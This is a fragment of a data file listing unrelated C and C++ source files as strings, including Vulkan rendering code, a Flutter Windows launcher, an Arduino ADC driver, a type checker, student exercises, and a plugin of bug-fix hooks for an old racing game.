GetScene();\n\n\t\t\tVkDescriptorSet descriptorSets[] = { visibilityPipeline_->DescriptorSet(imageIndex) };\n\t\t\tVkBuffer vertexBuffers[] = { scene.VertexBuffer().Handle() };",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ui_practice\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"SwapChain.hpp\"\n#include \"Device.hpp\"\n#include \"Enumerate.hpp\"\n#include \"ImageView.hpp\"\n#include \"Instance.hpp\"\n#include \"Surface.hpp\"\n#include \"Window.hpp\"\n#include \"Utilities/Exception.hpp\"\n#include <algorithm>\n#include <limits>\n\n#if ANDROID\n#include <android/log.h>\n#endif\n\nnamespace Vulkan {\n\nSwapChain::SwapChain(const class Device& device, const VkPresentModeKHR presentMode) :\n\tphysicalDevice_(device.PhysicalDevice()),\n\tdevice_(device)\n{\n\tconst auto details = QuerySwapChainSupport(device.PhysicalDevice(), device.Surface().Handle());\n\tif (details.Formats.empty() || details.PresentModes.empty())\n\t{\n\t\tthrow std::runtime_error(\"empty swap chain support\");\n\t}\n\n\tconst auto& surface = device.Surface();\n\tconst auto& window = surface.Instance().Window();\n\n\tconst auto surfaceFormat = ChooseSwapSurfaceFormat(details.Formats);\n\tconst auto actualPresentMode = ChooseSwapPresentMode(details.PresentModes, presentMode);\n\tauto extent = ChooseSwapExtent(window, details.Capabilities);\n\tconst auto imageCount = ChooseImageCount(details.Capabilities);\n\n#if ANDROID\n\tfloat aspect = extent.width / static_cast<float>(extent.height);\n\textent.height = 1920;\n\textent.width = floorf(1920 * aspect);\n#endif\n\t\n\tVkSwapchainCreateInfoKHR createInfo = {};\n\tcreateInfo.sType = VK_STRUCTURE_TYPE_SWAPCHAIN_CREATE_INFO_KHR;\n\tcreateInfo.surface = surface.Handle();\n\tcreateInfo.minImageCount = imageCount;\n\tcreateInfo.imageFormat = surfaceFormat.format;\n\tcreateInfo.imageColorSpace = surfaceFormat.colorSpace;\n\tcreateInfo.imageExtent = extent;\n\tcreateInfo.imageArrayLayers = 1;\n\tcreateInfo.imageUsage = VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT | VK_IMAGE_USAGE_TRANSFER_SRC_BIT | VK_IMAGE_USAGE_TRANSFER_DST_BIT;\n\tcreateInfo.preTransform = details.Capabilities.currentTransform;\n\tcreateInfo.compositeAlpha = VK_COMPOSITE_ALPHA_OPAQUE_BIT_KHR;\n\tcreateInfo.presentMode = actualPresentMode;\n\tcreateInfo.clipped = VK_TRUE;\n\tcreateInfo.oldSwapchain = nullptr;\n\t\n\tif (device.GraphicsFamilyIndex() != device.PresentFamilyIndex())\n\t{\n\t\tuint32_t queueFamilyIndices[] = { device.GraphicsFamilyIndex(), device.PresentFamilyIndex() };\n\n\t\tcreateInfo.imageSharingMode = VK_SHARING_MODE_CONCURRENT;\n\t\tcreateInfo.queueFamilyIndexCount = 2;\n\t\tcreateInfo.pQueueFamilyIndices = queueFamilyIndices;\n\t}\n\telse\n\t{\n\t\tcreateInfo.imageSharingMode = VK_SHARING_MODE_EXCLUSIVE;\n\t\tcreateInfo.queueFamilyIndexCount = 0; // Optional\n\t\tcreateInfo.pQueueFamilyIndices = nullptr; // Optional\n\t}\n\n\tCheck(vkCreateSwapchainKHR(device.Handle(), &createInfo, nullptr, &swapChain_),\n\t\t\"create swap chain!\");\n\n\tminImageCount_ = std::max(2u, details.Capabilities.minImageCount);\n\tpresentMode_ = actualPresentMode;\n\tformat_ = surfaceFormat.format;\n\textent_ = extent;\n\timages_ = GetEnumerateVector(device_.Handle(), swapChain_, vkGetSwapchainImagesKHR);\n\timageViews_.reserve(images_.size());\n\n\tfor (const auto image : images_)\n\t{\n\t\timageViews_.push_back(std::make_unique<ImageView>(device, image, format_, VK_IMAGE_ASPECT_COLOR_BIT));\n\t}\n\n\tconst auto& debugUtils = device.DebugUtils();\n\n\tfor (size_t i = 0; i != images_.size(); ++i)\n\t{\n\t\tdebugUtils.SetObjectName(images_[i], (\"Swapchain Image #\" + std::to_string(i)).c_str());\n\t\tdebugUtils.SetObjectName(imageViews_[i]->Handle(), (\"Swapchain ImageView #\" + std::to_string(i)).c_str());\n\t}\n}\n\nSwapChain::~SwapChain()\n{\n\timageViews_.clear();\n\n\tif (swapChain_ != nullptr)\n\t{\n\t\tvkDestroySwapchainKHR(device_.Handle(), swapChain_, nullptr);\n\t\tswapChain_ = nullptr;\n\t}\n}\n\nSwapChain::SupportDetails SwapChain::QuerySwapChainSupport(VkPhysicalDevice physicalDevice, const VkSurfaceKHR surface)\n{\n\tSupportDetails details;\n\n\tvkGetPhysicalDeviceSurfaceCapabilitiesKHR(physicalDevice, surface, &details.Capabilities);\n\tdetails.Formats = GetEnumerateVector(physicalDevice, surface, vkGetPhysicalDeviceSurfaceFormatsKHR);\n\tdetails.PresentModes = GetEnumerateVector(physicalDevice, surface, vkGetPhysicalDeviceSurfacePresentModesKHR);\n\n\treturn details;\n}\n\nVkSurfaceFormatKHR SwapChain::ChooseSwapSurfaceFormat(const std::vector<VkSurfaceFormatKHR>& formats) \n{\n\tif (formats.size() == 1 && formats[0].format == VK_FORMAT_UNDEFINED) \n\t{\n\t\treturn { VK_FORMAT_B8G8R8A8_UNORM, VK_COLOR_SPACE_SRGB_NONLINEAR_KHR };\n\t}\n\n\t// hdr first\n\tfor (const auto& format : formats)\n\t{\n\t\t\n\t\tif (format.colorSpace == VK_COLOR_SPACE_HDR10_ST2084_EXT || format.colorSpace == VK_COLOR_SPACE_HDR10_HLG_EXT)\n\t\t{\n\t\t\treturn format;\n\t\t}\n\t}\n\n\t// display p3 for android\n\tfor (const auto& format : formats)\n\t{\n\t\t\n\t\tif (format.colorSpace == VK_COLOR_SPACE_DISPLAY_P3_NONLINEAR_EXT)\n\t\t{\n\t\t\treturn format;\n\t\t}\n\t}\n\t\n\t// sdr fallback\n\tfor (const auto& format : formats)\n\t{\n\t\tif (format.format == VK_FORMAT_B8G8R8A8_UNORM && format.colorSpace == VK_COLOR_SPACE_SRGB_NONLINEAR_KHR)\n\t\t{\n\t\t\treturn format;\n\t\t}\n\t}\n\n    for (const auto& format : formats)\n    {\n        if (format.format == VK_FORMAT_R8G8B8A8_UNORM && format.colorSpace == VK_COLOR_SPACE_SRGB_NONLINEAR_KHR)\n        {\n            return format;\n        }\n    }\n\n\t// bad driver\n\tThrow(std::runtime_erro",
    "#include <iostream>\n#include <unordered_map>\n#include <set>\n\n#include \"components_allocator.h\"\n#include \"traits.h\"\n\ntemplate<typename EntityIDT>\nrequires(std::is_integral_v<EntityIDT>)\nstruct entity\n{\n    EntityIDT entity_id = -1;\n    std::set<component_type_id_t> components;\n};\n\ntemplate<typename EntityIDT>\nrequires(std::is_integral_v<EntityIDT>)\nstruct basic_registry;\n\ntemplate<typename EntityIDT, typename... ComponentsT>\nrequires(std::is_integral_v<EntityIDT>)\nstruct basic_view\n{\n    friend struct basic_registry<EntityIDT>;\n\n    template<typename FuncT>\n    void each(FuncT&& func)\n    {\n        for(size_t i = 0; i < std::numeric_limits<size_t>::max(); ++i)\n        {\n            bool breakFor = false;\n            for_types<ComponentsT...>([&](auto typeHolder) {\n                using component_t = typename decltype(typeHolder)::type;\n\n                if(allocators[get_type_id<component_t>()]->size() <= i)\n                {\n                    breakFor = true;\n                }\n            });\n\n            if(breakFor) return;\n\n            func((*(ComponentsT*) ((*allocators[get_type_id<ComponentsT>()]).get(i)->component_mem))...);\n        }\n    }\n\nprivate:\n    std::unordered_map<component_type_id_t, components_allocator<EntityIDT>*> allocators;\n};\n\ntemplate<typename EntityIDT>\nrequires(std::is_integral_v<EntityIDT>)\nstruct basic_registry\n{\n    template<typename... ComponentsT>\n    auto view()\n    {\n        basic_view<EntityIDT, ComponentsT...> view;\n        view.allocators = {\n                {get_type_id<ComponentsT>(), &allocators[get_type_id<ComponentsT>()] }\n                ...\n        };\n\n        return view;\n    }\n\n    entity_t create() noexcept\n    {\n        return ++max_entity;\n    }\n\n    template<typename ComponentT, typename... Args>\n    ComponentT& emplace(entity_t forEntity, Args&&... args)\n    {\n        auto& allocator = allocators[get_type_id<ComponentT>()];\n        basic_component_holder<EntityIDT>* holder =\n                allocator.template allocate<ComponentT, Args...>(forEntity, std::forward<Args>(args)...);\n        return (*(ComponentT*) holder->component_mem);\n    }\n\n    template<typename ComponentT>\n    void remove(entity_t forEntity)\n    {\n        auto* allocator = allocators[get_type_id<ComponentT>()];\n        allocator->template deallocate<ComponentT>(forEntity);\n    }\n\nprivate:\n    std::unordered_map<std::uint32_t, components_allocator<EntityIDT>> allocators;\n    std::vector<entity<EntityIDT>> entities;\n    entity_t max_entity = 0;\n};\n\nusing registry = basic_registry<entity_t>;\nusing view = basic_view<entity_t >;\n\nstruct position\n{\n    float x = 0;\n    float y = 0;\n    float z = 0;\n};\n\nstruct rotation\n{\n    float x = 0;\n    float y = 0;\n    float z = 0;\n};\n\nint main()\n{\n    registry reg;\n    entity_t e0 = reg.create();\n    auto& pos = reg.emplace<position>(e0, 10, 10, 20);\n    auto& rot = reg.emplace<rotation>(e0, 10, 20, 30);\n\n    auto v = reg.view<position, rotation>();\n    v.each([](const position& p, const rotation& r) {\n        std::printf(\"position: %f, %f, %f | rotation: %f, %f, %f\\n\", p.x, p.y, p.z, r.x, r.y, r.z);\n    });\n\n    std::cout << \"Hello, World!\" << std::endl;\n    return 0;\n}\n",
    "#include \"targets/type_checker.h\"\n#include \".auto/all_nodes.h\" // automatically generated\n#include <cdk/types/primitive_type.h>\n#include <string>\n\n#include <til_parser.tab.h>\n\n#define ASSERT_UNSPEC                                                          \\\n  {                                                                            \\\n    if (node->type() != nullptr && !node->is_typed(cdk::TYPE_UNSPEC))          \\\n      return;                                                                  \\\n  }\n\nbool til::type_checker::ptr_types_compatibility_check(\n    std::shared_ptr<cdk::basic_type> t1, std::shared_ptr<cdk::basic_type> t2) {\n  auto t1_ptr = t1;\n  auto t2_ptr = t2;\n  // while both are pointers, keep checking the referenced types\n  while (t1_ptr->name() == cdk::TYPE_POINTER &&\n         t2_ptr->name() == cdk::TYPE_POINTER) {\n    t1_ptr = cdk::reference_type::cast(t1_ptr)->referenced();\n    t2_ptr = cdk::reference_type::cast(t2_ptr)->referenced();\n  }\n  return t1_ptr->name() == t2_ptr->name() || t2_ptr->name() == cdk::TYPE_UNSPEC;\n}\n\nbool til::type_checker::func_types_compatibility_check(\n    std::shared_ptr<cdk::functional_type> t1,\n    std::shared_ptr<cdk::functional_type> t2) {\n  // the return type must be compatible\n  if ((t1->output_length() > 0 && t2->output_length() > 0) &&\n      !types_compatibility_check(t1->output(0), t2->output(0)))\n    return false;\n\n  // the number of arguments must be the same\n  if (t1->input_length() != t2->input_length())\n    return false;\n\n  // the types of the arguments must be compatible\n  for (size_t i = 0; i < t1->input_length(); i++)\n    if (!types_compatibility_check(t1->input(i), t2->input(i)))\n      return false;\n  return true;\n}\n\nbool til::type_checker::types_compatibility_check(\n    std::shared_ptr<cdk::basic_type> t1, std::shared_ptr<cdk::basic_type> t2,\n    bool is_return) {\n  const auto t1_name = t1->name();\n  const auto t2_name = t2->name();\n  switch (t1_name) {\n  case cdk::TYPE_INT:\n  case cdk::TYPE_DOUBLE:\n    if (!(t2_name == cdk::TYPE_DOUBLE || t2_name == cdk::TYPE_INT))\n      return false;\n    break;\n  case cdk::TYPE_STRING:\n    if (t2_name != cdk::TYPE_STRING)\n      return false;\n    break;\n  case cdk::TYPE_POINTER:\n    if (is_return == (t2_name == cdk::TYPE_POINTER) &&\n        !ptr_types_compatibility_check(t1, t2))\n      return false;\n    break;\n  case cdk::TYPE_FUNCTIONAL:\n    if (!((t2_name == cdk::TYPE_FUNCTIONAL &&\n           func_types_compatibility_check(cdk::functional_type::cast(t1),\n                                      cdk::functional_type::cast(t2))) ||\n          (t2_name == cdk::TYPE_POINTER &&\n           cdk::reference_type::cast(t2)->referenced() == nullptr)))\n      return false;\n    break;\n  case cdk::TYPE_UNSPEC: // useful for auto cases\n    if (t2_name == cdk::TYPE_VOID)\n      // var x = f(), where f calls return void, is not allowed\n      return false;\n    break;\n  default:\n    if (t1_name != t2_name)\n      return false;\n  }\n  return true;\n}\n\nvoid til::type_checker::incompatible_types_throw(\n    std::shared_ptr<cdk::basic_type> t1, std::shared_ptr<cdk::basic_type> t2,\n    bool is_return) {\n  if (types_compatibility_check(t1, t2))\n    return;\n\n  const std::string field_name =\n      is_return ? \"return\" : \"initialization\";\n  switch (t1->name()) {\n  case cdk::TYPE_INT:\n  case cdk::TYPE_DOUBLE:\n    throw std::string(\"wrong type in \" + field_name +\n                      \" (expected double or int)\");\n  case cdk::TYPE_STRING:\n    throw std::string(\"wrong type in \" + field_name + \" (string was expected)\");\n  case cdk::TYPE_POINTER:\n    throw std::string(\"wrong type in \" + field_name + \" (pointer was expected)\");\n  case cdk::TYPE_FUNCTIONAL:\n    throw std::string(\"wrong type in \" + field_name + \" (function was expected)\");\n  default:\n    throw std::string(\"unknown type in \" + field_name);\n  }\n}\n\nvoid til::type_checker::on_match_change_type(cdk::typed_node *const lvalue,\n                                             cdk::typed_node *const rvalue) {\n  const auto ltype = lvalue->type();\n  const auto rtype = rvalue->type();\n  if (ltype->name() == cdk::TYPE_UNSPEC && rtype->name() == cdk::TYPE_UNSPEC) {\n    // var x = input;\n    lvalue->type(cdk::primitive_type::create(4, cdk::TYPE_INT));\n    rvalue->type(cdk::primitive_type::create(4, cdk::TYPE_INT));\n  } else if ((ltype->name() == cdk::TYPE_POINTER &&\n              rtype->name() == cdk::TYPE_POINTER &&\n              ptr_types_compatibility_check(ltype, rtype)) ||\n             (ltype->name() == cdk::TYPE_FUNCTIONAL &&\n              rtype->name() == cdk::TYPE_FUNCTIONAL &&\n              func_types_compatibility_check(cdk::functional_type::cast(ltype),\n                                         cdk::functional_type::cast(rtype))) ||\n             ((ltype->name() == cdk::TYPE_INT ||\n               ltype->name() == cdk::TYPE_DOUBLE) &&\n              rtype->name() == cdk::TYPE_UNSPEC)) {\n    rvalue->type(ltype);\n  }\n}\n\nbool til::type_checker::handleBinaryExpression(\n    cdk::binary_operation_node *const",
    "/*\n  This is a library written for the TI ADS122U04\n  24-Bit 4-Channel 2-kSPS Delta-Sigma ADC With I2C Interface\n\n  It allows you to measure temperature very accurately using a\n  Platinum Resistance Thermometer\n\n  Written by: Yasir Shahzad\n  Date: May 4th 2024\n\n  Based on the TI datasheet:\n  https://www.ti.com/product/ADS122U04\n  https://www.ti.com/lit/ds/symlink/ads122c04.pdf\n  Using the example code from the \"High Precision Temperature Measurement\n  for Heat and Cold Meters Reference Design\" (TIDA-01526) for reference:\n  http://www.ti.com/tool/TIDA-01526\n  http://www.ti.com/lit/zip/tidcee5\n\n  The MIT License (MIT)\n  Copyright (c) 2024 mastermind Electronics\n  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and\n  associated documentation files (the \"Software\"), to deal in the Software without restriction,\n  including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\n  and/or sell copies of the Software, and to permit persons to whom the Software is furnished to\n  do so, subject to the following conditions:\n\n  The above copyright notice and this permission notice shall be included in all copies or substantial\n  portions of the Software.\n\n  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT\n  NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n  SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include \"ADS122U04_ADC_Arduino_Library.h\"\n\nSFE_ADS122U04::SFE_ADS122U04(void)\n{\n  // Constructor\n}\n\n//Attempt communication with the device and initialise it\n//Return true if successful\nbool SFE_ADS122U04::begin(uint8_t deviceAddress, HardwareSerial &serialPort)\n{\n  Serial.println(\"Entering function: \" + String(__func__));\n  _deviceAddress = deviceAddress; //If provided, store the I2C address from user\n  _serialPort = &serialPort; // Grab which serial port the user wants us to use\n  _wireMode = ADS122U04_RAW_MODE; //Default to using 'safe' settings (disable the IDAC current sources)\n\n  delay(1); // wait for power-on reset to complete (datasheet says we should do this)\n\n  if (isConnected() == false)\n  {\n    if (_printDebug == true)\n    {\n      _debugPort->println(F(\"begin: isConnected returned false\"));\n    }\n    return (false);\n  }\n\n  reset(); // reset the ADS122U04 (datasheet says we should do this)\n  delay(1);\n\n  return(configureADCmode(ADS122U04_RAW_MODE)); // Default to using 'safe' settings (disable the IDAC current sources)\n}\n\n// Configure the chip for the selected wire mode\n//Disable the burnout current source\n//Use Internal Source\n//No need for the IDAC1,2\n// Short the Inputs and average over a range\n//Consequently Subtract the averaged reading from the Result on the Analog Channels to Reduce the Noise Subsequently\n// Data Counter Register to Check if the data value is new or not\n\nbool SFE_ADS122U04::configureADCmode(uint8_t wire_mode, uint8_t rate)\n{\n  ADS122U04_initParam initParams; // Storage for the chip parameters\n\n if (wire_mode == ADS122U04_RAW_MODE) // Raw mode : disable the IDAC and use the internal reference\n  {\n    initParams.inputMux = ADS122U04_MUX_AIN0_AIN1; // Route AIN1 to AINP and AIN0 to AINN\n    initParams.gainLevel = ADS122U04_GAIN_128; // Set the gain to 1\n    initParams.pgaBypass = ADS122U04_PGA_ENABLED;\n    initParams.dataRate = rate; // Set the data rate (samples per second). Defaults to 20\n    initParams.opMode = ADS122U04_OP_MODE_TURBO; // Disable turbo mode\n    initParams.convMode = ADS122U04_CONVERSION_MODE_CONTINUOUS; // Use single shot mode\n    initParams.selectVref = ADS122U04_VREF_AVDD1; // Use the internal 2.048V reference todo\n    initParams.tempSensorEn = ADS122U04_TEMP_SENSOR_OFF; // Disable the temperature sensor\n    initParams.dataReadyEn = 0b0;\n    initParams.dataCounterEn = ADS122U04_DCNT_DISABLE; // Disable the data counter\n    initParams.dataCRCen = ADS122U04_CRC_DISABLED; // Disable CRC checking\n    initParams.burnOutEn = ADS122U04_BURN_OUT_CURRENT_OFF; // Disable the burn-out current\n    initParams.idacCurrent = ADS122U04_IDAC_CURRENT_OFF; // Disable the IDAC current\n    initParams.routeIDAC1 = ADS122U04_IDAC1_DISABLED; // Disable IDAC1\n    initParams.routeIDAC2 = ADS122U04_IDAC2_DISABLED; // Disable IDAC2\n    initParams.outputMODE = 0b0; \n    initParams.gpio2DIR = 0b1; \n    initParams.gpio1DIR = 0b0; \n    initParams.gpio0DIR = 0b0; \n    initParams.gpio2SEL = 0b1; \n    initParams.gpio2DAT = 0b0; \n    initParams.gpio1DAT = 0b0; \n    initParams.gpio0DAT = 0b0; \n    _wireMode = ADS122U04_RAW_MODE; // Update the wire mode\n  }\n  else\n  {\n    if (_printDebug == true)\n    {\n      _debugPort->println(F(\"configureADCmode: unknown mode\"));\n    }\n    return(false);\n  }\n  return(AD",
    "//Ejercicio 3\r\n\r\n\r\n#include <iostream>\r\n#include <cmath>\r\nusing namespace std;\r\n\r\nint main() {\r\n    int opcion;\r\n    cout << \"Elija la figura para calcular el area: \\n\";\r\n    cout << \"1. Cuadrado\\n\";\r\n    cout << \"2. Triangulo\\n\";\r\n    cout << \"3. Circulo\\n\";\r\n    cin >> opcion;\r\n\r\n    switch (opcion) {\r\n        case 1: {\r\n            double lado;\r\n            cout << \"Introduzca la longitud del lado del cuadrado: \";\r\n            cin >> lado;\r\n            double areaCuadrado = lado * lado;\r\n            cout << \"El area del cuadrado es: \" << areaCuadrado << endl;\r\n            break;\r\n        }\r\n        case 2: {\r\n            double base, altura;\r\n            cout << \"Introduzca la base del triangulo: \";\r\n            cin >> base;\r\n            cout << \"Introduzca la altura del triangulo: \";\r\n            cin >> altura;\r\n            double areaTriangulo = (base * altura) / 2;\r\n            cout << \"El area del triangulo es: \" << areaTriangulo << endl;\r\n            break;\r\n        }\r\n        case 3: {\r\n            double radio;\r\n            cout << \"Introduzca el radio del circulo: \";\r\n            cin >> radio;\r\n            double areaCirculo = M_PI * pow(radio, 2);\r\n            cout << \"El area del c\u00edrculo es: \" << areaCirculo << endl;\r\n            break;\r\n        }\r\n        default:\r\n            cout << \"Opci\u00f3n no v\u00e1lida\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <shellapi.h>\n#include \"hook_mgr.hpp\"\n#include \"plugin.hpp\"\n#include \"game_addrs.hpp\"\n\nclass FixPegasusClopping : public Hook\n{\n\tconst static int SndOff_PEGA_Addr = 0x4BCC0;\n\n\tinline static SafetyHookInline SndOff_PEGA = {};\n\tstatic void destination()\n\t{\n\t\tSndOff_PEGA.call();\n\n\t\tconstexpr int SfxClop = 0x8D;\n\t\tGame::PrjSndRequest(SND_STOP | SfxClop);\n\t}\n\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"FixPegasusClopping\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::FixPegasusClopping;\n\t}\n\n\tbool apply() override\n\t{\n\t\tSndOff_PEGA = safetyhook::create_inline(Module::exe_ptr(SndOff_PEGA_Addr), destination);\n\t\treturn !!SndOff_PEGA;\n\t}\n\n\tstatic FixPegasusClopping instance;\n};\nFixPegasusClopping FixPegasusClopping::instance;\n\nclass FixC2CRankings : public Hook\n{\n\t// A lot of the C2C ranking code has a strange check that tries to OpenEventA an existing named event based on current process ID\n\t// However no code is included in the game to actually create this event first, so the OpenEventA call fails, and game skips the ranking code body\n\t// \n\t// The only hit for that 0x19EA3FD3 magic number on google is a semi-decompiled Razor1911 crack, which contains code that creates this event\n\t// (searching github shows this might be \"SecuROM_Tripwire\")\n\t// \n\t// Guess it's probably something that gets setup by the SecuROM stub code, and then game devs can add some kind of \"if(SECUROM_CHECK) { do stuff }\" which inserts the OpenEventA stuff\n\t// For the Steam release it seems they repacked the original pre-securom-wrapper 2006 game EXE without any changes, guess they forgot these checks were included?\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"FixC2CRankings\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::FixC2CRankings;\n\t}\n\n\tbool apply() override\n\t{\n\t\tchar Buffer[52];\n\n\t\tDWORD CurrentProcessId = GetProcessId(GetCurrentProcess());\n\t\tsprintf(Buffer, \"v7_%04d\", CurrentProcessId ^ 0x19EA3FD3);\n\t\tCreateEventA(0, 1, 1, Buffer);\n\n\t\treturn true;\n\t}\n\n\tstatic FixC2CRankings instance;\n};\nFixC2CRankings FixC2CRankings::instance;\n\nclass PreventDESTSaveCorruption : public Hook\n{\n\t// Games input remapping code loops over every dinput device detected\n\t// for each one it updates some 0xB0 block of device-data from 0x7C211C onward\n\t// however, player save data begins at 0x7C23E0, which leaves only 0x2C4 bytes for device-data\n\t// 0x2C4 / 0xB0 = ~4 blocks of device-data, but as mentioned it'll still loop over every device\n\t// So past 4 dinput devices it'll trample over anything after the 0x2C4 bytes :(\n\tconst static int SumoInputDeviceLoop_Addr = 0xD85C0;\n\n\t// workaround it by lying to the function when it checks how many dinput devices are available\n\t// probably means you won't be able to remap devices past device #4, ah well\n\tinline static SafetyHookMid dest_hook = {};\n\tstatic void destination(safetyhook::Context& ctx)\n\t{\n\t\tif (ctx.eax > 4)\n\t\t\tctx.eax = 4;\n\t}\n\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"PreventDESTSaveCorruption\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::PreventDESTSaveCorruption;\n\t}\n\n\tbool apply() override\n\t{\n\t\tdest_hook = safetyhook::create_mid(Module::exe_ptr(SumoInputDeviceLoop_Addr), destination);\n\t\treturn !!dest_hook;\n\t}\n\n\tstatic PreventDESTSaveCorruption instance;\n};\nPreventDESTSaveCorruption PreventDESTSaveCorruption::instance;\n\nclass FixLensFlarePath : public Hook\n{\n\t// Game tries to load in lens flare data from common/, but the game files have it inside media/, causing lens flare not to be drawn.\n\t// We'll just patch code to load from media/ instead\n\t// (only patch it if file actually exists inside media/ though, some may have already moved it to common/)\n\n\tconst static int LoadLensFlareOffset_StringAddr = 0x1A29F8;\n\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"FixLensFlarePath\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::FixLensFlarePath;\n\t}\n\n\tbool apply() override\n\t{\n\t\tstd::string NewPath = \"\\\\media\\\\lens_flare_offset.bin\";\n\t\tif (std::filesystem::exists(\".\" + NewPath))\n\t\t{\n\t\t\tauto* patch_addr = Module::exe_ptr<char>(LoadLensFlareOffset_StringAddr);\n\n\t\t\tDWORD dwProtect;\n\t\t\tVirtualProtect((void*)patch_addr, NewPath.length(), PAGE_EXECUTE_READWRITE, &dwProtect);\n\t\t\tstrcpy(patch_addr, NewPath.c_str());\n\t\t\tVirtualProtect((void*)patch_addr, NewPath.length(), dwProtect, &dwProtect);\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tstatic FixLensFlarePath instance;\n};\nFixLensFlarePath FixLensFlarePath::instance;\n",
    "// \u7403\u7403\u5927\u4f5c\u6218low\u7248.cpp : \u5b9a\u4e49\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\r\n//\r\n\r\n#include \"stdafx.h\"\r\n\r\n#include <graphics.h> //\u5b89\u88c5\u56fe\u5f62\u5e93  \u5f15\u5165\u5934\u6587\u4ef6\r\n#include <vector>\r\nusing namespace std;\r\n//\u7a97\u53e3\u5bbd\r\n#define WIDTH  600\r\n//\u7a97\u53e3\u9ad8\r\n#define HEIGHT 800\r\n//\u654c\u5bf9\u7403\u6570\u91cf\r\n#define NUM\t\t20\r\n\r\n\r\n\r\n/*\r\n1.\u505a\u4e00\u4e2a\u7a97\u53e3(\u63a7\u5236\u53f0,\u56fe\u5f62\u754c\u9762:easyX win32  MFC QT java  py  h5)\r\n2.\u505a\u654c\u5bf9\u5c0f\u7403   N\u4e2a\r\n2.1 \u751f\u6210\u5c0f\u7403\r\n2.2 \u5c0f\u7403\u79fb\u52a8\r\n2.3 \u5c0f\u7403\u6b7b\u4ea1(\u79fb\u52a8\u51fa\u754c\u9762)\r\n3.\u505a\u81ea\u5df1\u7684\u5c0f\u7403 1\u4e2a\r\n3.1 \u751f\u6210\u5c0f\u7403\r\n3.2 \u5c0f\u7403\u79fb\u52a8\r\n3.3 \u78b0\u649e\u68c0\u6d4b:\r\n\u5c0f\u7403\u53d8\u5927\u548c\u6e38\u620f\u7ed3\u675f\r\n*/\r\n\r\nstruct Fx{//\u65b9\u5411\r\n\tint x;//\u5355\u4f4d\u65f6\u95f4x\u8f74\u79fb\u52a8\u8ddd\u79bb\t   \u6b63:\u53f3  \u8d1f:\u5de6\r\n\tint y;//\u5355\u4f4d\u65f6\u95f4y\u8f74\u79fb\u52a8\u8ddd\u79bb      \u6b63:\u4e0b  \u8d1f:\u4e0a\r\n};\r\n\r\n\r\nstruct Ball{\r\n\tint\t\t\tx, y;\t\t//\u5750\u6807\r\n\tint\t\t\tradius;\t\t//\u534a\u5f84\r\n\tCOLORREF\tcolor;\t\t//\u989c\u8272\r\n\tFx\t\t\tfx;\t\t\t//\u65b9\u5411\r\n};\r\n\r\n\r\nCOLORREF  colors[7] = { BLACK, GREEN, CYAN, MAGENTA, BROWN, YELLOW, BLUE };\r\n\r\n//\u654c\u5bf9\u7403\r\nvector<Ball> diBalls;\r\n//\u81ea\u5df1\u7403\r\nBall myBall;\r\n\r\n\r\nHWND hWnd;\r\n//\u662f\u5426\u5b58\u6d3b\r\nbool isLive = true;\r\n\r\n\r\n\r\n\r\n//\u521d\u59cb\u5316\u6e38\u620f\r\nvoid initGame();\r\n//\u6e38\u620f\u754c\u9762\u7ed8\u5236\r\nvoid drawGame();\r\n//\u6e38\u620f\u6d41\u7a0b\u63a7\u5236\r\nvoid controlGame();\r\n//\u5b9a\u65f6\u5668\u5904\u7406\u51fd\u6570\r\nvoid proc();\r\n//\u7ebf\u7a0b\u51fd\u6570  \u8bbe\u7f6e\u81ea\u5df1\u7403\u968f\u9f20\u6807\u79fb\u52a8\r\nvoid setMyBall();\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n\r\n\tinitGame();\r\n\r\n\tdrawGame();\r\n\r\n\twhile (1);\r\n\treturn 0;\r\n}\r\n\r\nvoid initGame() {\r\n\t//1 